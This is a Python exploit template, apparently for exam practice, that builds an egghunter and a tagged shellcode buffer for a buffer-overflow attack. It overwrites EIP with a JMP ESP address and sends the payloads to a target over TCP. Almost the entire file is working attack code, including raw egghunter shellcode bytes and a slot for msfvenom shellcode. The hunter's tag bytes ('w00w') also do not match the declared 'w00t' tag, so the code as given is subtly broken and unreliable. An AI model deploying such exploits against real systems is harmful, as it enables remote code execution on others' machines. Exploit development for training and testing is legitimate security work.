#!/usr/bin/env python3
"""
egghunter.py — Egghunter template for tiny-space situations.

Two payloads:
  1) HUNTER goes at the controlled pointer (EIP or via SEH). ~32 bytes.
  2) egg + real shellcode goes in a LARGER buffer somewhere in memory.
The hunter scans memory for 'w00tw00t' and jumps to the byte after it.

Companion: 00-methodology/egghunter-playbook.md
"""
import struct

# ── CONFIG ────────────────────────────────────────────────────────────────────
RHOST     = "127.0.0.1"
RPORT     = 9999
OFFSET    = 0
JMP_ESP   = 0x625011af            # or PPR for SEH variant
BADCHARS  = b"\x00\x0a\x0d"
TAG       = b"w00t"              # -> searched as w00tw00t
# ────────────────────────────────────────────────────────────────────────────────

def p32(a): return struct.pack("<I", a)

# NtAccessCheckAndAuditAlarm egghunter (classic, ~32 bytes). Generate the exact bytes
# for YOUR badchar set with:  !py mona egg -t w00t
# This is the well-known form searching for 'w00tw00t' (0x74303077 repeated):
EGGHUNTER = (
    b"\x66\x81\xca\xff\x0f"      # or dx,0x0fff
    b"\x42"                      # inc edx
    b"\x52"                      # push edx
    b"\x6a\x02"                  # push 2  (NtAccessCheckAndAuditAlarm)
    b"\x58"                      # pop eax
    b"\xcd\x2e"                  # int 0x2e
    b"\x3c\x05"                  # cmp al,5
    b"\x5a"                      # pop edx
    b"\x74\xef"                  # je (back to inc edx)
    b"\xb8\x77\x30\x30\x77"      # mov eax, 'w00w' -> tag 'w00t' little-endian variant
    b"\x8b\xfa"                  # mov edi, edx
    b"\xaf"                      # scasd
    b"\x75\xea"                  # jnz
    b"\xaf"                      # scasd
    b"\x75\xe7"                  # jnz
    b"\xff\xe7"                  # jmp edi
)
# NOTE: the exact tag bytes above must match TAG. ALWAYS regenerate with mona for the
# real exam and badchar-check the result — do not trust a pasted hunter blindly.

# The real shellcode, tagged twice:
# msfvenom ... -b "\x00\x0a\x0d" -f python
_real = b""                      # <-- paste msfvenom bytes here
EGG   = TAG + TAG                # w00tw00t
TAGGED_SHELLCODE = EGG + _real


def payload_hunter():
    """Small buffer: overwrite pointer, land in the hunter."""
    buf  = b"A" * OFFSET
    buf += p32(JMP_ESP)
    buf += b"\x90" * 8
    buf += EGGHUNTER
    return buf


def payload_egg(total_len=4000):
    """Large buffer carrying the tagged real shellcode (sent to a roomy field)."""
    buf  = TAGGED_SHELLCODE
    buf += b"C" * max(0, total_len - len(buf))
    return buf


if __name__ == "__main__":
    import sys
    sys.path.insert(0, ".")
    from send_helpers import send_tcp
    # Typical: deliver the roomy tagged buffer first (so it's resident in memory),
    # then the small hunter buffer that triggers the crash. Order depends on the app.
    which = sys.argv[1] if len(sys.argv) > 1 else "hunter"
    buf = payload_egg() if which == "egg" else payload_hunter()
    send_tcp(RHOST, RPORT, buf)
    print(f"[+] sent {which} ({len(buf)} bytes)")
